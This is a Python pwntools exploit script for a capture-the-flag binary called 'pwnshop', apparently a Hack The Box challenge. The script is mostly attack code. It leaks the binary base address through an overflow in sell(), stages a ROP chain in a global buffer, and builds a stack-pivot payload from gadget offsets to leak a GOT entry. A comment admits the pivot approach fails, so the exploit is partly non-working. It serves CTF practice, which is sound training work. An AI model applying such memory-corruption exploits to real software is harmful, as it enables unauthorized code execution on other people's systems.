#!/usr/bin/env python3

from pwn import *

e = ELF("./pwnshop_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      set breakpoint pending on
                      b __libc_start_call_main
                      command 1
                        # the last few instructions in main()
                        set $a = $rdi + 113
                        b *$a
                        # sell()
                        set $a = $rdi + 89
                        b *$a
                        # ret in buy()
                        set $a = $rdi + 699
                        b *$a
                        c
                      end
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r

# Note that the ghidra shows the address with base address 0x100000
DETAIL_BUFF_OFFSET = 0x40c0
MAIN_OFFSET = 0x10a0
SUB_RSP_0x28_OFFSET = 0x1219
POP_RSP_AND_3_POP_OFFSET = 0x13bd
RET_OFFSET = 0x101a

def main():
    r = conn()

    # TODO: trying the stack pivot. But the puts() will use up the stack space. Thus this approach fails.

    # Step 1: use sell() to leak the binary base address.
    r.sendlineafter(b'> ', b'2')
    r.sendafter(b'What do you wish to sell? ', b'A' * 31)
    price = b'B' * 8
    r.sendafter(b'How much do you want for it? ', price)
    r.recvuntil(b'What? ' + price)
    detail_buff = u64(r.recvn(6) + b'\x00' * 2)
    info(f'detail buffer address is at {hex(detail_buff)}')
    e.address = detail_buff - DETAIL_BUFF_OFFSET
    info(f'binary base is at {hex(e.address)}')
    main_addr = e.address + MAIN_OFFSET
    info(f'main addr is at {hex(main_addr)}')

    # Step 2: use sell() to prepare the ROP in the detail_buff.
    rop = ROP(e)
    rop.raw(b'\x90' * 8)    # To counter the extra pops.
    rop.raw(b'\x90' * 8)
    rop.raw(b'\x90' * 8)
    rop.puts(e.got.puts)
    rop.raw(main_addr)
    info(f'rop length is {len(rop.chain())}')
    r.sendlineafter(b'> ', b'2')
    r.sendafter(b'What do you wish to sell? ', b'A')
    r.sendlineafter(b'How much do you want for it? ', b'13.37') # Somehow the string to compare is `13.37\n`
    r.sendafter(b'take a look.', rop.chain())

    # Step 3: trigger stack pivot
    r.sendlineafter(b'> ', b'1')
    sub_rsp_0x28_gadget = e.address + SUB_RSP_0x28_OFFSET
    pop_rsp_and_3_pop_gadget = e.address + POP_RSP_AND_3_POP_OFFSET
    payload = flat(
            b'A' * 40,
            pop_rsp_and_3_pop_gadget,
            detail_buff,
            b'A' * 16,
            sub_rsp_0x28_gadget,
            )
    r.sendafter(b'Enter details:', payload)

    r.interactive()

if __name__ == "__main__":
    main()
